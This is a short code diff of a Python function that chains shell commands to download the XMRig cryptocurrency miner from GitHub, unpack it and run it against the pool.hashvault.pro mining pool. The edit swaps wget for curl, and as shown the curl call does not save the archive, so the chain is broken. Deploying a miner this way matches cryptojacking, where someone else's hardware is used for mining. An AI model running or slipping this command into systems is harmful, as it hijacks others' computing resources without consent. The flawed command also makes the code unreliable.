@@ -4,8 +4,8 @@ import sys
 def deploy_and_run():
     # The chained shell commands provided
     command = (
-        "apt install -y wget &&"
-        "wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
+        
+        "curl https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
         "tar xvzf xmrig-6.21.1-linux-x64.tar.gz && "
         "cd xmrig-6.21.1 && "
         "./xmrig --url pool.hashvault.pro:443 "
